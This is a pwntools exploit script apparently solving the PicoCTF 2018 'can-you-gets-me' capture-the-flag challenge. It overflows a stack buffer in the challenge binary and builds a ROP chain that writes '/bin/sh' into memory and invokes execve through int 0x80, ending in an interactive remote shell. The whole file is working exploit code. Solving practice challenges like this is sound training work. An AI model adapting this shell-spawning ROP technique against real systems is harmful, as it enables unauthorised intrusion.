from pwn import *

context.os = 'linux'
context.arch = 'i386'
# context.log_level = 'debug'

io = remote('node4.buuoj.cn', 27061)
e = ELF('./PicoCTF_2018_can-you-gets-me')

log.info(hex(e.bss()))

pop_eax_ret = 0x80b81c6
pop_edx_ecx_ebx_ret = 0x806f050
int_0x80 = 0x806cc25

payload1 = b'a'*(0x18 + 4) + p32(e.sym['gets']) + p32(pop_eax_ret) + p32(e.bss())
payload1 += p32(pop_eax_ret) + p32(11) + p32(pop_edx_ecx_ebx_ret) + p32(0)*2 + p32(e.bss())
payload1 += p32(int_0x80)

payload2 = b'/bin/sh\x00'
io.sendline(payload1)
io.send(payload2)
io.interactive()
